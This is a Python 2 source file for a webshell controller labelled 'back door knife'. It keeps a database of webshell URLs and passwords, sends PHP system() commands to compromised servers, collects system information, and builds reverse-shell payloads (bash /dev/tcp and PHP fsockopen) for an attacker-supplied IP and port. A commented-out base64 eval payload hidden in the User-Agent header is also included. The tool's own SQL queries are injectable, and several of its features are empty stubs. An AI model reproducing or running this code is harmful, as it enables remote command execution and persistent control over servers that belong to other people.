#-- coding:utf-8 --
import getopt
import sys
import urllib
import urllib2
import base64
import pyodbc
import sys
import time

class MyCahe():
    def __init__(self):

        self.cahe = {}
        self.maxsize = 50

#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

def help():

    print 'back door knife'
    print ''
    print 'writen by UD94'
    print 'USAGE:'
    print '     -a ,--action : the action which you want to take, like add, delete ,exec'
    print '     -u ,--url :the url of one sentence'
    print '     -p ,--password: the password of webshell'
    print '     -h ,--help : help message'
    print '\n'
    print 'action type:'
    print 'the action of this tool can take:'
    print 'add'.ljust(10) + ':add new url like -a add -u url -p password'
    print 'delete'.ljust(10) + ':delete url like -a delete -u url'
    print 'exec'.ljust(10) + ':goto exec mode like -a exec -u url -p password'
    print 'help'.ljust(10) + ':the help information like help'

def act(cursor):

    action = ''
    url = ''
    password = ''
    shell_type = ''
    help()

    o, a = getopt.getopt(sys.argv[1:], 'a:p:hu:', ['action', 'password', 'help', 'url'])

    for o, a in o:
        if o in ('-a', '--action'):
            action = a
        elif o in ('-p', '--password'):
            password = a
        elif o in ('-h', '--help'):
            help()
        elif o in ('-u', '--url'):
            url = a

    while True:

        if not action:
            print 'please input usage -a'
            help()
            sys.exit()

        if action == 'add':
            if not url:
                print 'please input url'
                url = raw_input('->')

            if not password:
                print 'please input password'
                password = raw_input('->')

            shell_type = type_check(url)

            add(cursor,url,password,shell_type)
        elif action == 'exec':
            if not url:
                print 'please input url'
                url = raw_input('->')

            if not password:
                print 'please input password'
                password = raw_input('->')

            shell_type = type_check(url)

            exec_webshell(url,password)

        elif action == 'delete':

            if not url:
                print 'please input url'
                url = raw_input('->')
            delete(cursor,url)
        elif action == 'check':
            check(cursor)

        else:

            print 'unkown action!please input again.'
            help()


        action = raw_input('continue action:')
        url = ''
        password = ''
        shell_type = ''


def type_check(url):

    if 'php' in url:
        shell_type = 'php'
    elif 'asp' in url:
        shell_type = 'asp'
    elif 'aspx' in url:
        shell_type = 'aspx'
    elif 'jsp' in url:
        shell_type = 'jsp'
    else:
        print 'unknown type,please input '
        shell_type = raw_input('->:')
    return shell_type


def connect_access():

    DBfile = './cd.accdb'
    conn = pyodbc.connect(r'DRIVER={Microsoft Access Driver (*.mdb, *.accdb)};DBQ=' + DBfile + '; Provider=MSDASQL;')
    return conn

def disconnect(conn):

    conn.cursor().close()
    conn.close()

def add(cursor,url,password,shell_type):

    SQL = "INSERT INTO table1(url, password,shell_type)VALUES('" + url + "','"+password+"','"+shell_type+"')"
    cursor.execute(SQL)
    cursor.commit()

def check(cursor):

    SQL = 'SELECT * from table1;'
    for row in cursor.execute(SQL):
        print row.url,row.password

def delete(cursor,url):

    SQL = 'delete from table1 where url = '+ url
    cursor.execute(SQL)
    cursor.commit()


def action_function():

    print 'the function of aim you can do:'
    print '     cmdline'.ljust(20) + ':go to cmd-mode'
    print '     informatioin packet'.ljust(20) + ':list the information of aim'
    print '     rebound'.ljust(20) + ':rebound a interactive shell'
    print '     waf_mode'.ljust(20) + ':go to waf-mode to pass the waf'
    print '     clear_cahe'.ljust(20) + ':clear the cahe of aim'
    print '     get_cahe'.ljust(20) + ':get the struct of aim'
    print '     function'.ljust(20) + ':the funciton of the tool'
    print '     exit'.ljust(20) + ':exit the knife'

def rebound_help():
    print 'the rebound type:'
    print 'php,bash,ruby,java,python'

def rebound(ip,port,type):
    if type == 'bash':
        post_part = "bash -i >& //dev//tcp//" + ip + "//" + port + " 0>&1"
    elif type == 'php':
        post_part = '$sock=fsockopen("'+ ip + '",'+ port +');exec("/bin/sh -i <&3 >&3 2>&3");'
    elif type == 'java':
        post_part = ''
    elif type == 'ruby':
        pass
    elif type == 'python':
        pass

    return  post_part

def normal_cmd(url,password,cmd):

    q = {password: cmd}
    q = urllib.urlencode(q)
    req = urllib2.Request(url, q)
    response = urllib2.urlopen(req)
    page = response.readlines()

def exec_webshell(url,password):

    if 'http://' in url:
        pass
    else:
        url = 'http://' + url

    while True:

        action_function()
        action_shell = raw_input('action shell->')

        if action_shell == 'cmdline':

            path_now = ''
            data_part1 = ''
            data = "system('echo %cd%',$out);echo $out;"
            q = {password:data}
            q = urllib.urlencode(q)
            req = urllib2.Request(url,q)
            response = urllib2.urlopen(req)
            page = response.readlines()
            path_now = page[0]

            while True:


                data_part1 = 'cd /d' + path_now.strip() + '&'

                data = raw_input(path_now.strip() + '\\')
                data = data_part1 + data + '&cd'
                data = "system('"+ data +"',$out);echo $out;"
                q = {password: data}
                q = urllib.urlencode(q)
                req = urllib2.Request(url, q)
                response = urllib2.urlopen(req)
                result = response.readlines()
                path_now = result[len(result)-2]
                for i in result:
                    print i



        elif action_shell == 'information packet':

            data = "system('echo %cd%',$out);echo $out;"
            q = {password: data}
            q = urllib.urlencode(q)

            try:
                req = urllib2.Request(url, q)
                response = urllib2.urlopen(req)
                page = response.readlines()

            except:
                print 'failed!please try waf_mode'
                continue

            data = "system('systeminfo>%cd%\\1.txt',$out);echo $out;"
            q = {password: data}
            q = urllib.urlencode(q)
            req = urllib2.Request(url, q)
            response = urllib2.urlopen(req)
            page = response.readlines()


        elif action_shell == 'rebound':

            rebound_list = ['java','php','bash','ruby','python']
            type = raw_input('please input type:')
            if type not in rebound_list:
                print 'this type is not supported'
                rebound_help()
                continue

            ip = raw_input('ip:')
            port = raw_input('port:')
            data = rebound(ip,port,type)
            q = {password: data}
            q = urllib.urlencode(q)
            req = urllib2.Request(url, q)

        elif action_shell == 'waf_mode':
            pass
        elif action_shell == 'clear_cahe':
            pass
        elif action_shell == 'get_cahe':
            pass
        elif action_shell == 'function':
            action_function()
        elif action_shell == 'exit':
            break
        else:
            print 'unkown command!'
            action_function()
            print 'please input again'

    #data = "system('echo %cd%',$out);echo $out;"
    #data = base64.b64encode(data)
    #req = urllib2.Request(url)
    #data = '$'+ password +' = base64_decode(\'' + data + '\');@eval($'+ password +');'
    #req.add_header('User-Agent', data)
    #response = urllib2.urlopen(req)
    #page = response.read()
    #print page


def main():
    conn = connect_access()
    cursor = conn.cursor()
    act(cursor)
    disconnect(conn)

#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
if __name__ == '__main__':
    main()